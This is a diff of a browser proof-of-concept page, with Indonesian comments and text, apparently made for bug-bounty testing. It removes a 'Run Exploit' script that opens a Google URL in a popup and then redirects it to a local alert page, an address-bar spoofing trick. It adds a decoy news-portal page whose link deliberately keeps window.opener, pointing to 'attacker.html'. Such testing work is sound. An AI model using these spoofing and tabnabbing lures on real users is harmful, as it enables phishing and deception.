@@ -1,18 +1,22 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Situs Portal Berita</title>
+    <style>
+        body { font-family: sans-serif; padding: 40px; background: #fdfdfd; }
+        .container { border: 1px solid #ddd; padding: 30px; border-radius: 12px; max-width: 600px; margin: auto; background: white; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+        .btn { color: #007bff; text-decoration: underline; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
 <body>
-    <button onclick="myFunction()">Run Exploit</button>
-
-    <script>
-    function myFunction() {
-        // Buka Google CSI (atau domain Google lainnya)
-        var x = window.open("https://www.google.com/csi", "poc_win", "width=500,height=600");
-
-        // Tunggu 1 detik biar Address Bar stabil di Google, baru tembak alert.html
-        setTimeout(function(){
-            x.location = "alert.html";
-        }, 1000);
-    }
-    </script>
+    <div class="container">
+        <h1>Portal Berita Mahasiswa</h1>
+        <p>Halo, silakan baca artikel terbaru dari kontributor kami:</p>
+        
+        <p>👉 <a href="attacker.html" target="_blank" rel="opener" class="btn">Tips Jago Bug Bounty 2026</a></p>
+        
+        <p><small><i>Cara Test: Klik kanan link biru, pilih "Open link in new tab".</i></small></p>
+    </div>
 </body>
 </html>
